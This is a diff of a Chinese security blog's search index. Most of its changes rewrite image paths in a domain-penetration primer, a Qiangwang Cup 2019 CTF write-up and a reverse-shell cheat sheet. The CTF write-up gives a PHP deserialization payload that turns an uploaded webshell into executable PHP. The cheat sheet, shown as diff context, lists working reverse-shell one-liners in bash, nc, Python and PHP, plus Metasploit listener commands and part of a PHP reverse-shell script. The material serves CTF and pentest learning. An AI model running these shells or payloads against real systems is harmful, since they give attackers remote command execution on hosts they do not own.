@@ -1,6 +1,11 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>test</title>
+    <url>/2019/12/03/test/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>域渗透入门</title>
     <url>/2019/12/03/domain/</url>
     <content><![CDATA[<h1 id="Part-1-相关概念"><a href="#Part-1-相关概念" class="headerlink" title="Part 1 相关概念"></a>Part 1 相关概念</h1><h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><p><code>域(domain)</code>是<code>Windows</code>中独立运行的单位,将网络中多台计算机逻辑上组织到一起,进行集中管理,这种区别于工作组的逻辑环境叫做域<br>域已经成为绝大多数公司组织、连接电脑的一种方式。假设你是公司的系统管理员,你们公司有几千上万台电脑,如果你要为每台电脑设置登录帐户,设置权限(比如是否允许登录帐户安装软件),那你要分别坐在这一十台电脑前工作,如果你要做一些改变,你也要分别在这一十台电脑上修改。相信没有哪个管理员愚要用这种不吃不喝不睡觉的方式来工作,所以就应运而生了域的概念。</p>
@@ -32,10 +37,10 @@
     <title>强网杯2019-web-upload</title>
     <url>/2019/11/29/qwb-upload/</url>
     <content><![CDATA[<h1 id="第三届强网杯-WEB-Upload-WriteUp"><a href="#第三届强网杯-WEB-Upload-WriteUp" class="headerlink" title="第三届强网杯 WEB-Upload WriteUp"></a>第三届强网杯 WEB-Upload WriteUp</h1><p>这一题主要考察了代码审计+反序列化过程的理解</p>
-<h2 id="Part-1"><a href="#Part-1" class="headerlink" title="Part 1"></a>Part 1</h2><p>打开题目是个登录框<br><img src="/images/qwb-upload/login.png" alt="login"></p>
-<p>由于题目名字是<code>upload</code>先随便注册个账号登录看看,发现有一个上传点,<br><img src="/images/qwb-upload/index.png" alt="index"></p>
-<p>用<code>蚁剑</code>生成<code>shell</code>,加上<code>GIF89a</code>文件头上传<br><img src="/images/qwb-upload/up.png" alt="up"></p>
-<p>可以看到这里的<code>cookie</code>是一串<code>base64</code>,<code>decode</code>一下<br><img src="/images/qwb-upload/cookie.png" alt="cookie"></p>
+<h2 id="Part-1"><a href="#Part-1" class="headerlink" title="Part 1"></a>Part 1</h2><p>打开题目是个登录框<br><img src="/2019/11/29/qwb-upload/login.png" alt="login"></p>
+<p>由于题目名字是<code>upload</code>先随便注册个账号登录看看,发现有一个上传点,<br><img src="/2019/11/29/qwb-upload/index.png" alt="index"></p>
+<p>用<code>蚁剑</code>生成<code>shell</code>,加上<code>GIF89a</code>文件头上传<br><img src="/2019/11/29/qwb-upload/up.png" alt="up"></p>
+<p>可以看到这里的<code>cookie</code>是一串<code>base64</code>,<code>decode</code>一下<br><img src="/2019/11/29/qwb-upload/cookie.png" alt="cookie"></p>
 <p>这是<code>PHP</code>对象序列化后的字符串,其中还包括了刚刚上传的图片的路径,可以看到图片被重命名为<code>MD5.png</code>的格式,</p>
 <h2 id="Part-2-代码审计"><a href="#Part-2-代码审计" class="headerlink" title="Part 2 代码审计"></a>Part 2 代码审计</h2><p>反序列化需要源码的可以根据提示直接访问<code>\www.tar.gz</code>拿到<br>看了看比较关键的文件源码</p>
 <p><code>application\web\controller\Index.php</code></p>
@@ -78,12 +83,12 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp=<span class="string">"../public/upload/916147a757e9009808495904bbd7119a/3d694425bf5c9803db0c7b3d776cd2f1.png"</span>;</span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">"../public/upload/916147a757e9009808495904bbd7119a/shell.php"</span>;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except=<span class="keyword">array</span>(<span class="string">'index'</span>=&gt;<span class="string">'upload_img'</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ex=<span class="keyword">new</span> Register();</span><br><span class="line">$ex-&gt;checker=<span class="keyword">new</span> Profile();</span><br><span class="line">$ex-&gt;checker-&gt;checker = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($ex));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>替换掉<code>cookie</code>,返回主页,报错了</p>
-<p><img src="/images/qwb-upload/err.png" alt="err"></p>
+<p><img src="/2019/11/29/qwb-upload/err.png" alt="err"></p>
 <p>当执行<code>login_check</code>时,反序列化<code>cookie</code>,最终修改上传<code>shell</code>的后缀为<code>php</code></p>
-<p><img src="/images/qwb-upload/dir.png" alt="dir"></p>
+<p><img src="/2019/11/29/qwb-upload/dir.png" alt="dir"></p>
 <p>再用<code>蚁剑</code>连接即可<code>getshell</code></p>
-<p><img src="/images/qwb-upload/as1.png" alt="as1"></p>
-<p><img src="/images/qwb-upload/as2.png" alt="as2"></p>
+<p><img src="/2019/11/29/qwb-upload/as1.png" alt="as1"></p>
+<p><img src="/2019/11/29/qwb-upload/as2.png" alt="as2"></p>
 <h2 id="part-4-攻击流程"><a href="#part-4-攻击流程" class="headerlink" title="part 4 攻击流程"></a>part 4 攻击流程</h2><p><code>Index.php</code>中<code>unserialize</code><br>=&gt;<code>Register.php</code>中<code>__destruct</code>执行<code>Profile</code>对象的<code>index()</code><br>=&gt;触发<code>Profile.php</code>中<code>__call(&#39;index&#39;,&quot;&quot;)</code><br>=&gt;触发<code>Profile.php</code>中<code>__get</code>执行<code>except[&#39;index&#39;]</code><br>=&gt;调用<code>except[&#39;index&#39;]</code>即<code>upload_img</code>修改文件名</p>
 ]]></content>
       <categories>
@@ -97,16 +102,16 @@
   </entry>
   <entry>
     <title>反弹shell姿势总结</title>
-    <url>/2019/11/27/ReverseShell/</url>
-    <content><![CDATA[<h1 id="反弹-shell-姿势总结"><a href="#反弹-shell-姿势总结" class="headerlink" title="反弹 shell 姿势总结"></a>反弹 shell 姿势总结</h1><h2 id="在Kali上开启监听"><a href="#在Kali上开启监听" class="headerlink" title="在Kali上开启监听"></a>在<code>Kali</code>上开启监听</h2><h3 id="使用-nc"><a href="#使用-nc" class="headerlink" title="使用 nc"></a>使用 <code>nc</code></h3><pre><code><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nc -lvp <span class="number">4444</span></span><br></pre></td></tr></table></figure></code></pre><p><img src="/images/reverseShell/nc.png" alt="ncshell"></p>
+    <url>/2019/11/27/reverseShell/</url>
+    <content><![CDATA[<h1 id="反弹-shell-姿势总结"><a href="#反弹-shell-姿势总结" class="headerlink" title="反弹 shell 姿势总结"></a>反弹 shell 姿势总结</h1><h2 id="在Kali上开启监听"><a href="#在Kali上开启监听" class="headerlink" title="在Kali上开启监听"></a>在<code>Kali</code>上开启监听</h2><h3 id="使用-nc"><a href="#使用-nc" class="headerlink" title="使用 nc"></a>使用 <code>nc</code></h3><pre><code><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nc -lvp <span class="number">4444</span></span><br></pre></td></tr></table></figure></code></pre><p><img src="/2019/11/27/reverseShell/nc.png" alt="ncshell"></p>
 <h3 id="使用msf"><a href="#使用msf" class="headerlink" title="使用msf"></a>使用<code>msf</code></h3><p>注意系统不同所使用的<code>payload</code>也不同,可根据<code>uname -a</code>查看系统内核信息</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploits/multi/handler</span><br><span class="line">set payload linux/x64/shell/reverse_tcp</span><br><span class="line">set lhost yourhost</span><br><span class="line">set lport yourport</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/reverseShell/msf2.png" alt="msf1"></p>
-<h2 id="发送shell"><a href="#发送shell" class="headerlink" title="发送shell"></a>发送<code>shell</code></h2><h3 id="Linux-反弹-shell"><a href="#Linux-反弹-shell" class="headerlink" title="Linux 反弹 shell"></a>Linux 反弹 shell</h3><pre><code><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip<span class="built_in">/port </span>0&gt;&amp;1</span><br></pre></td></tr></table></figure></code></pre><h3 id="使用nc"><a href="#使用nc" class="headerlink" title="使用nc"></a>使用<code>nc</code></h3><pre><code>nc 192.168.140.128 4444 -e /bin/sh</code></pre><p><img src="/images/reverseShell/nc2.png" alt="nc2"><br><img src="/images/reverseShell/nc3.png" alt="nc3"><br>若不支持<code>-e</code>参数<br>则分别在发送端(192.168.140.129:prot2)和接收端(192.168.140.128:port1)开启监听<br><code>nc 192.168.140.128 port1|/bin/bash|192.168.140.129 port2</code></p>
+<p><img src="/2019/11/27/reverseShell/msf2.png" alt="msf1"></p>
+<h2 id="发送shell"><a href="#发送shell" class="headerlink" title="发送shell"></a>发送<code>shell</code></h2><h3 id="Linux-反弹-shell"><a href="#Linux-反弹-shell" class="headerlink" title="Linux 反弹 shell"></a>Linux 反弹 shell</h3><pre><code><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip<span class="built_in">/port </span>0&gt;&amp;1</span><br></pre></td></tr></table></figure></code></pre><h3 id="使用nc"><a href="#使用nc" class="headerlink" title="使用nc"></a>使用<code>nc</code></h3><pre><code>nc 192.168.140.128 4444 -e /bin/sh</code></pre><p><img src="/2019/11/27/reverseShell/nc2.png" alt="nc2"><br><img src="/2019/11/27/reverseShell/nc3.png" alt="nc3"><br>若不支持<code>-e</code>参数<br>则分别在发送端(192.168.140.129:prot2)和接收端(192.168.140.128:port1)开启监听<br><code>nc 192.168.140.128 port1|/bin/bash|192.168.140.129 port2</code></p>
 <h3 id="使用python"><a href="#使用python" class="headerlink" title="使用python"></a>使用<code>python</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.140.128",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/reverseShell/py.png" alt="py"><br><img src="/images/reverseShell/py2.png" alt="py2"></p>
+<p><img src="/2019/11/27/reverseShell/py.png" alt="py"><br><img src="/2019/11/27/reverseShell/py2.png" alt="py2"></p>
 <h3 id="使用-php"><a href="#使用-php" class="headerlink" title="使用 php"></a>使用 php</h3><pre><code><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php- <span class="string">'exec("/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777")'</span></span><br></pre></td></tr></table></figure></code></pre><p>可上传或拥有一定读写权限时可使用<code>https://github.com/pentestmonkey/php-reverse-shell</code></p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">set_time_limit (<span class="number">0</span>);</span><br><span class="line">$VERSION = <span class="string">"1.0"</span>;</span><br><span class="line">$ip = <span class="string">'127.0.0.1'</span>;  <span class="comment">// CHANGE THIS</span></span><br><span class="line">$port = <span class="number">1234</span>;       <span class="comment">// CHANGE THIS</span></span><br><span class="line">$chunk_size = <span class="number">1400</span>;</span><br><span class="line">$write_a = <span class="keyword">null</span>;</span><br><span class="line">$error_a = <span class="keyword">null</span>;</span><br><span class="line">$shell = <span class="string">'uname -a; w; id; /bin/sh -i'</span>;</span><br><span class="line">$daemon = <span class="number">0</span>;</span><br><span class="line">$debug = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
 
